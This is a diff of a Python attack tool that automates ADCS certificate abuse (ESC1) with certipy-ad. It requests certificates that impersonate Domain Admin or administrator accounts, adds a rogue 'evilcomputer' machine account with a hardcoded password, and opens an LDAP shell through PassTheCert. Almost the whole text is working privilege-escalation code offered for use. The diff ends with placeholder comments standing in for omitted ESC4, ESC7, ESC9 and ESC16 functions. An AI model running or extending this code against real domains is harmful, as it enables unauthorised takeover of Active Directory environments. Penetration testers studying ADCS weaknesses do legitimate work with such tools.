@@ -1,7 +1,6 @@
 import subprocess
 import json
 import os
-import time
 
 def run_certipy_find(username, password, domain, dc_ip=None):
     cmd = [
@@ -32,41 +31,75 @@ def save_results_to_json(data, filepath):
     except Exception as e:
         print(f"[!] Failed to save results: {e}")
 
-def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
+def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name, output):
     print("[*] Exploiting ESC1 vulnerability...")
-
-    req_cmd = [
-        "certipy-ad", "req",
-        "-u", username,
-        "-p", password,
-        "-target", domain,
-        "-upn", f"administrator@{domain}",
-        "-ca", ca_name,
-        "-template", template_name,
-        "-key-size", "4096"
-    ]
-
-    print(f"[*] Running request command: {' '.join(req_cmd)}")
-    try:
-        subprocess.run(req_cmd, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Certipy request failed: {e}")
-        return
-
-    auth_cmd = f'faketime "$(ntpdate -q {domain} | cut -d \' \' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain {domain}'
-    if dc_ip:
-        auth_cmd += f' -dc-ip {dc_ip}'
-
-    print(f"[*] Running auth command: {auth_cmd}")
-    try:
-        subprocess.run(auth_cmd, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Certipy auth failed: {e}")
+    
+    auth_users = f"{domain.upper()}\\Authenticated Users" in output
+    domain_computers = f"{domain.upper()}\\Domain Computers" in output
+    
+    if auth_users and domain_computers:
+        choice = input("\n[?] U wanna enroll as Authenticated Users(1) or Domain Computers(2)? ")
+        while choice not in ['1', '2']:
+            choice = input("[!] Invalid choice. Please enter 1 or 2: ")
+    else:
+        choice = '2' if domain_computers else '1'
+    
+    if choice == '1':
+        da_choice = input("\n[?] Watch out!!! U cannot go Administrator directly. Is there any DA member u can go? (Y/N): ").upper()
+        while da_choice not in ['Y', 'N']:
+            da_choice = input("[!] Invalid choice. Please enter Y or N: ").upper()
+        
+        if da_choice == 'Y':
+            target_user = input("[?] Enter DA username (without domain): ")
+            upn = f"{target_user}@{domain}"
+            dns = input("[?] Enter target DNS or IP for SAN: ")
+        else:
+            target_user = "administrator"
+            upn = f"administrator@{domain}"
+            dns = dc_ip
+        
+        req_cmd = [
+            "certipy-ad", "req",
+            "-u", username,
+            "-p", password,
+            "-ca", ca_name,
+            "-target", domain,
+            "-template", template_name,
+            "-upn", upn,
+            "-dns", dns,
+            
+        ]
+        
+        print(f"[*] Running request command: {' '.join(req_cmd)}")
+        try:
+            subprocess.run(req_cmd, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Certipy request failed: {e}")
+            return
+        
+        auth_cmd = f'certipy-ad auth -pfx {target_user}_10.pfx -dc-ip {dc_ip} -domain {domain}'
+        print(f"[*] Running auth command: {auth_cmd}")
+        try:
+            subprocess.run(auth_cmd, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Certipy auth failed: {e}")
+    
+    else:
+        if domain_computers:
+            exploit_esc1_domain_computer(
+                username=username,
+                password=password,
+                domain=domain,
+                dc_ip=dc_ip,
+                ca_name=ca_name,
+                template_name=template_name
+            )
+        else:
+            print("[!] No valid enrollment method found")
 
 def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, template_name):
-    print("[*] Exploiting ESC1 vulnerability via Domain Computer account...")
+    print("[*] Exploiting ESC1 via Domain Computer account...")
     
-    # Step 1: Add computer account
     computer_name = "evilcomputer"
     computer_pass = "Winter2025!"
     
@@ -83,7 +116,6 @@ def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, tem
         print(f"[!] Failed to add computer account: {e}")
         return
     
-    # Step 2: Request certificate as computer account
     print("[*] Requesting certificate as computer account...")
     try:
         subprocess.run([
@@ -100,7 +132,6 @@ def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, tem
         print(f"[!] Certipy request failed: {e}")
         return
     
-    # Step 3: Extract cert and key
     print("[*] Extracting certificate and key...")
     try:
         subprocess.run([
@@ -120,7 +151,6 @@ def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, tem
         print(f"[!] Failed to extract certificate or key: {e}")
         return
     
-    # Step 4: Start LDAP shell
     print("[*] Starting LDAP shell with PassTheCert...")
     try:
         subprocess.run([
@@ -133,6 +163,8 @@ def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, tem
         ], check=True)
     except subprocess.CalledProcessError as e:
         print(f"[!] Failed to start LDAP shell: {e}")
+
+# ... [keep existing ESC4, ESC7, ESC9, ESC16 functions] ...
 
 # ... [keep the existing ESC4 and ESC7 functions unchanged] ...
 # ESC4
